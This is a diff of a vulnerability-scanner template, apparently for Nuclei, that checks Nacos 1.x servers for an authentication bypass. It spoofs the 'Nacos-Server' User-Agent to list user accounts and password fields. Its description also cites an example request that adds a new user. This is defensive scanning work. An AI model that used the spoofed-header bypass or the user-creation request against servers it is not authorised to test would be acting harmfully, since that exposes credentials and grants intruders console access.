@@ -1,38 +1,40 @@
-id: unauthenticated-nacos-access 2
+id: unauthenticated-nacos-access
+
 info:
+  name: Nacos 1.x - Authentication Bypass
   author: taielab,pikpikcu
-  name: Unauthenticated Nacos access v1.x
   severity: critical
-  tags: nacos,unauth
-requests:
-- attack: sniper
-  matchers:
-  - part: header
-    type: word
-    words:
-    - 'Content-Type: application/json'
-  - condition: and
-    part: body
-    regex:
-    - '"username":'
-    - '"password":'
-    type: regex
-  - status:
-    - 200
-    type: status
-  matchers-condition: and
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
+  description: "Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data."
+  reference:
+    - https://github.com/alibaba/nacos/issues/4593
+    - https://nacos.io/en-us/docs/auth.html
+  tags: nacos,unauth,misconfig
+  metadata:
+    max-request: 2
 
-    Host: {{Subdomains}}
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9"
+      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9"
+    headers:
+      User-Agent: Nacos-Server
 
-    User-Agent: Nacos-Server
+    matchers-condition: and
+    matchers:
 
-    Accept-Encoding: gzip, deflate
+      - type: word
+        words:
+          - "Content-Type: application/json"
+        part: header
 
-    Accept: */*
+      - type: regex
+        regex:
+          - '"username":'
+          - '"password":'
+        part: body
+        condition: and
 
-    '
-  threads: 100
+      - type: status
+        status:
+          - 200
